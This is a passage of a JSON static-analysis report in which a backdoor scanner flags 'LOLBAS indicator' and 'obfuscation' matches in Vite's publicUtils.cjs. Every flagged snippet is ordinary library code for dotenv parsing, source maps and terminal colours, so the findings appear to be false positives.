                    "text": "    // Remove surrounding quotes\n    value = value.replace(/^(['\"`])([\\s\\S]*)\\1$/mg, '$2');\n\n    // Expand newlines if double quoted\n    if (maybeQuote === '\"') {\n      value = value.replace(/\\\\n/g, '\\n');\n      value = value.replace(/\\\\r/g, '\\r');\n",
                    "rendered": {
                      "text": "    // Remove surrounding quotes\n    value = value.replace(/^(['\"`])([\\s\\S]*)\\1$/mg, '$2');\n\n    // Expand newlines if double quoted\n    if (maybeQuote === '\"') {\n      value = value.replace(/\\\\n/g, '\\n');\n      value = value.replace(/\\\\r/g, '\\r');\n",
                      "markdown": "`    // Remove surrounding quotes\n    value = value.replace(/^(['\"`])([\\s\\S]*)\\1$/mg, '$2');\n\n    // Expand newlines if double quoted\n    if (maybeQuote === '\"') {\n      value = value.replace(/\\\\n/g, '\\n');\n      value = value.replace(/\\\\r/g, '\\r');\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 4857,
                  "startColumn": 23,
                  "endLine": 4857,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n\t\t\tfirst.edit(content, storeName, !overwrite);\n\t\t} else {\n\t\t\t// must be inserting at the end\n\t\t\tconst newChunk = new Chunk(start, end, '').edit(content, storeName);\n\n\t\t\t// TODO last chunk in the array may not be the last chunk, if it's moved...\n",
                    "rendered": {
                      "text": "\n\t\t\tfirst.edit(content, storeName, !overwrite);\n\t\t} else {\n\t\t\t// must be inserting at the end\n\t\t\tconst newChunk = new Chunk(start, end, '').edit(content, storeName);\n\n\t\t\t// TODO last chunk in the array may not be the last chunk, if it's moved...\n",
                      "markdown": "`\n\t\t\tfirst.edit(content, storeName, !overwrite);\n\t\t} else {\n\t\t\t// must be inserting at the end\n\t\t\tconst newChunk = new Chunk(start, end, '').edit(content, storeName);\n\n\t\t\t// TODO last chunk in the array may not be the last chunk, if it's moved...\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3896,
                  "startColumn": 49,
                  "endLine": 3896,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileSource`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\t  var m = content.match(exports.mapFileCommentRegex);\n",
                    "rendered": {
                      "text": "\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileSource`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\t  var m = content.match(exports.mapFileCommentRegex);\n",
                      "markdown": "`\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileSource`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\t  var m = content.match(exports.mapFileCommentRegex);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3873,
                  "startColumn": 49,
                  "endLine": 3873,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileComment`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\n",
                    "rendered": {
                      "text": "\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileComment`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\n",
                      "markdown": "`\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileComment`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3746,
                  "startColumn": 73,
                  "endLine": 3746,
                  "endColumn": 77,
                  "snippet": {
                    "text": "\t  }\n\n\t  function throwError(e) {\n\t    throw new Error('An error occurred while trying to read the map file at ' + filename + '\\n' + e.stack);\n\t  }\n\t}\n\n",
                    "rendered": {
                      "text": "\t  }\n\n\t  function throwError(e) {\n\t    throw new Error('An error occurred while trying to read the map file at ' + filename + '\\n' + e.stack);\n\t  }\n\t}\n\n",
                      "markdown": "`\t  }\n\n\t  function throwError(e) {\n\t    throw new Error('An error occurred while trying to read the map file at ' + filename + '\\n' + e.stack);\n\t  }\n\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 2838,
                  "startColumn": 46,
                  "endLine": 2838,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    push({ type: 'maybe_slash', value: '', output: `${SLASH_LITERAL}?` });\n  }\n\n  // rebuild the output if we had to backtrack at any point\n  if (state.backtrack === true) {\n    state.output = '';\n\n",
                    "rendered": {
                      "text": "    push({ type: 'maybe_slash', value: '', output: `${SLASH_LITERAL}?` });\n  }\n\n  // rebuild the output if we had to backtrack at any point\n  if (state.backtrack === true) {\n    state.output = '';\n\n",
                      "markdown": "`    push({ type: 'maybe_slash', value: '', output: `${SLASH_LITERAL}?` });\n  }\n\n  // rebuild the output if we had to backtrack at any point\n  if (state.backtrack === true) {\n    state.output = '';\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6107,
                  "startColumn": 7,
                  "endLine": 6107,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    );\n  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n",
                    "rendered": {
                      "text": "    );\n  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n",
                      "markdown": "`    );\n  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 6053,
                  "startColumn": 8,
                  "endLine": 6053,
                  "endColumn": 16,
                  "snippet": {
                    "text": "  })\n}\n\nfunction expand (options) {\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n",
                    "rendered": {
                      "text": "  })\n}\n\nfunction expand (options) {\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n",
                      "markdown": "`  })\n}\n\nfunction expand (options) {\n  let processEnv = process.env;\n  if (options && options.processEnv != null) {\n    processEnv = options.processEnv;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5829,
                  "startColumn": 15,
                  "endLine": 5829,
                  "endColumn": 20,
                  "snippet": {
                    "text": "}\n\nfunction _configVault (options) {\n  _log('Loading env from encrypted .env.vault');\n\n  const parsed = DotenvModule._parseVault(options);\n\n",
                    "rendered": {
                      "text": "}\n\nfunction _configVault (options) {\n  _log('Loading env from encrypted .env.vault');\n\n  const parsed = DotenvModule._parseVault(options);\n\n",
                      "markdown": "`}\n\nfunction _configVault (options) {\n  _log('Loading env from encrypted .env.vault');\n\n  const parsed = DotenvModule._parseVault(options);\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5675,
                  "startColumn": 6,
                  "endLine": 5675,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    // Remove surrounding quotes\n    value = value.replace(/^(['\"`])([\\s\\S]*)\\1$/mg, '$2');\n\n    // Expand newlines if double quoted\n    if (maybeQuote === '\"') {\n      value = value.replace(/\\\\n/g, '\\n');\n      value = value.replace(/\\\\r/g, '\\r');\n",
                    "rendered": {
                      "text": "    // Remove surrounding quotes\n    value = value.replace(/^(['\"`])([\\s\\S]*)\\1$/mg, '$2');\n\n    // Expand newlines if double quoted\n    if (maybeQuote === '\"') {\n      value = value.replace(/\\\\n/g, '\\n');\n      value = value.replace(/\\\\r/g, '\\r');\n",
                      "markdown": "`    // Remove surrounding quotes\n    value = value.replace(/^(['\"`])([\\s\\S]*)\\1$/mg, '$2');\n\n    // Expand newlines if double quoted\n    if (maybeQuote === '\"') {\n      value = value.replace(/\\\\n/g, '\\n');\n      value = value.replace(/\\\\r/g, '\\r');\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5003,
                  "startColumn": 4,
                  "endLine": 5003,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n\t\tlet result = '';\n\n\t\t// find start chunk\n\t\tlet chunk = this.firstChunk;\n\t\twhile (chunk && (chunk.start > start || chunk.end <= start)) {\n\t\t\t// found end chunk before start\n",
                    "rendered": {
                      "text": "\n\t\tlet result = '';\n\n\t\t// find start chunk\n\t\tlet chunk = this.firstChunk;\n\t\twhile (chunk && (chunk.start > start || chunk.end <= start)) {\n\t\t\t// found end chunk before start\n",
                      "markdown": "`\n\t\tlet result = '';\n\n\t\t// find start chunk\n\t\tlet chunk = this.firstChunk;\n\t\twhile (chunk && (chunk.start > start || chunk.end <= start)) {\n\t\t\t// found end chunk before start\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3563,
                  "startColumn": 3,
                  "endLine": 3563,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n  const alias = {\n",
                    "rendered": {
                      "text": "  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n  const alias = {\n",
                      "markdown": "`  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n  const alias = {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3562,
                  "startColumn": 12,
                  "endLine": 3562,
                  "endColumn": 18,
                  "snippet": {
                    "text": "  replacement,\n  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n",
                    "rendered": {
                      "text": "  replacement,\n  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n",
                      "markdown": "`  replacement,\n  customResolver\n}) {\n  if (typeof find === \"string\" && find[find.length - 1] === \"/\" && replacement[replacement.length - 1] === \"/\") {\n    find = find.slice(0, find.length - 1);\n    replacement = replacement.slice(0, replacement.length - 1);\n  }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 3321,
                  "startColumn": 16,
                  "endLine": 3321,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    // Note that we use posix.join because:\n    // 1. the basePath has been normalized to use /\n    // 2. the incoming glob (id) matcher, also uses /\n    // otherwise Node will force backslash (\\) on windows\n    return require$$0$1.posix.join(basePath, normalizePath$1(id));\n}\nconst createFilter$1 = function createFilter(include, exclude, options) {\n",
                    "rendered": {
                      "text": "    // Note that we use posix.join because:\n    // 1. the basePath has been normalized to use /\n    // 2. the incoming glob (id) matcher, also uses /\n    // otherwise Node will force backslash (\\) on windows\n    return require$$0$1.posix.join(basePath, normalizePath$1(id));\n}\nconst createFilter$1 = function createFilter(include, exclude, options) {\n",
                      "markdown": "`    // Note that we use posix.join because:\n    // 1. the basePath has been normalized to use /\n    // 2. the incoming glob (id) matcher, also uses /\n    // otherwise Node will force backslash (\\) on windows\n    return require$$0$1.posix.join(basePath, normalizePath$1(id));\n}\nconst createFilter$1 = function createFilter(include, exclude, options) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 1069,
                  "startColumn": 65,
                  "endLine": 1069,
                  "endColumn": 71,
                  "snippet": {
                    "text": "\t\t/**\n\t\t * Build up the default `inspectOpts` object from the environment variables.\n\t\t *\n\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(key => {\n",
                    "rendered": {
                      "text": "\t\t/**\n\t\t * Build up the default `inspectOpts` object from the environment variables.\n\t\t *\n\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(key => {\n",
                      "markdown": "`\t\t/**\n\t\t * Build up the default `inspectOpts` object from the environment variables.\n\t\t *\n\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(key => {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 941,
                  "startColumn": 3,
                  "endLine": 941,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\treturn browser$1.exports;\n}\n\nvar node = {exports: {}};\n\n/**\n * Module dependencies.\n",
                    "rendered": {
                      "text": "\treturn browser$1.exports;\n}\n\nvar node = {exports: {}};\n\n/**\n * Module dependencies.\n",
                      "markdown": "`\treturn browser$1.exports;\n}\n\nvar node = {exports: {}};\n\n/**\n * Module dependencies.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 138,
                  "startColumn": 18,
                  "endLine": 138,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n\t\t(commonjsRequire != null && require$$0.isatty(1) && env.TERM !== \"dumb\") ||\n",
                    "rendered": {
                      "text": "\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n\t\t(commonjsRequire != null && require$$0.isatty(1) && env.TERM !== \"dumb\") ||\n",
                      "markdown": "`\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n\t\t(commonjsRequire != null && require$$0.isatty(1) && env.TERM !== \"dumb\") ||\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 137,
                  "startColumn": 16,
                  "endLine": 137,
                  "endColumn": 21,
                  "snippet": {
                    "text": "let argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n",
                    "rendered": {
                      "text": "let argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n",
                      "markdown": "`let argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n\t\targv.includes(\"--color\") ||\n\t\tprocess.platform === \"win32\" ||\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 135,
                  "endLine": 135,
                  "endColumn": 5,
                  "snippet": {
                    "text": "var picocolors = {exports: {}};\n\nlet argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n",
                    "rendered": {
                      "text": "var picocolors = {exports: {}};\n\nlet argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n",
                      "markdown": "`var picocolors = {exports: {}};\n\nlet argv = process.argv || [],\n\tenv = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env ||\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5921,
                  "startColumn": 43,
                  "endLine": 5921,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\nfunction decrypt (encrypted, keyStr) {\n  const key = Buffer.from(keyStr.slice(-64), 'hex');\n  let ciphertext = Buffer.from(encrypted, 'base64');\n\n  const nonce = ciphertext.subarray(0, 12);\n  const authTag = ciphertext.subarray(-16);\n",
                    "rendered": {
                      "text": "\nfunction decrypt (encrypted, keyStr) {\n  const key = Buffer.from(keyStr.slice(-64), 'hex');\n  let ciphertext = Buffer.from(encrypted, 'base64');\n\n  const nonce = ciphertext.subarray(0, 12);\n  const authTag = ciphertext.subarray(-16);\n",
                      "markdown": "`\nfunction decrypt (encrypted, keyStr) {\n  const key = Buffer.from(keyStr.slice(-64), 'hex');\n  let ciphertext = Buffer.from(encrypted, 'base64');\n\n  const nonce = ciphertext.subarray(0, 12);\n  const authTag = ciphertext.subarray(-16);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5312,
                  "startColumn": 68,
                  "endLine": 5312,
                  "endColumn": 74,
                  "snippet": {
                    "text": "  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$1) {\n",
                    "rendered": {
                      "text": "  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$1) {\n",
                      "markdown": "`  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$1) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 5312,
                  "startColumn": 32,
                  "endLine": 5312,
                  "endColumn": 38,
                  "snippet": {
                    "text": "  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$1) {\n",
                    "rendered": {
                      "text": "  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$1) {\n",
                      "markdown": "`  if (typeof map !== \"string\") {\n    map = JSON.stringify(map);\n  }\n  return `data:application/json;base64,${Buffer.from(map).toString(\"base64\")}`;\n}\nfunction getCodeWithSourcemap(type, code, map) {\n  if (debug$1) {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node-cjs/publicUtils.cjs"
                },
                "region": {
                  "startLine": 4276,
                  "startColumn": 46,
                  "endLine": 4276,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\t}\n\n\ttoUrl() {\n\t\treturn 'data:application/json;charset=utf-8;base64,' + btoa$1(this.toString());\n\t}\n}\n\n",
                    "rendered": {
